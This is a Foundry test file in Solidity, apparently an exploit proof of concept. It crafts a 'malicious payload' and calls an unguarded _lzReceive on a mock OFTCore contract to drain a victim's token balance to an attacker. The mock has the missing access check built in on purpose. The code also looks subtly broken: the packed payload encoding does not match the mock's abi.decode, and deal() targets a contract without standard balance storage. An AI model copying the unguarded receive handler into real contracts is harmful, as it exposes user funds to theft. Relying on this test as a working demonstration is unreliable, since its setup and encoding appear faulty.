// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for OFTCore contract
interface IOFTCore {
    function _lzReceive(bytes calldata _message) external;
    function getBalance(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    IOFTCore oftCore;
    address attacker;
    address victim;

    function setUp() public {
        // Deploy the OFTCore contract
        oftCore = IOFTCore(address(new MockOFTCore()));

        // Set up attacker and victim accounts
        attacker = address(0x1);
        victim = address(0x2);

        // Fund the victim account with some tokens
        deal(address(oftCore), victim, 1000 ether);
    }

    function test_exploit() public {
        // Step 1: Craft a malicious payload
        bytes memory maliciousPayload = abi.encodePacked(
            uint256(1), // Some command
            victim,     // Target victim address
            uint256(1000 ether), // Amount to transfer
            bytes32(0)  // Additional malicious data
        );

        // Step 2: Attacker sends the malicious payload
        vm.prank(attacker);
        oftCore._lzReceive(maliciousPayload);

        // Step 3: Assert the vulnerability
        // Check if the attacker's balance increased unexpectedly
        uint256 attackerBalance = oftCore.getBalance(attacker);
        assertGt(attackerBalance, 0);

        // Check if the victim's balance decreased unexpectedly
        uint256 victimBalance = oftCore.getBalance(victim);
        assertEq(victimBalance, 0);
    }
}

// Mock implementation of the OFTCore contract for testing
contract MockOFTCore is IOFTCore {
    mapping(address => uint256) private balances;

    function _lzReceive(bytes calldata _message) external override {
        // Decode the message (vulnerable to manipulation)
        (uint256 command, address target, uint256 amount, bytes32 extraData) = abi.decode(_message, (uint256, address, uint256, bytes32));

        // Process the command (simplified for demonstration)
        if (command == 1) {
            balances[target] -= amount;
            balances[msg.sender] += amount;
        }
    }

    function getBalance(address account) external view override returns (uint256) {
        return balances[account];
    }
}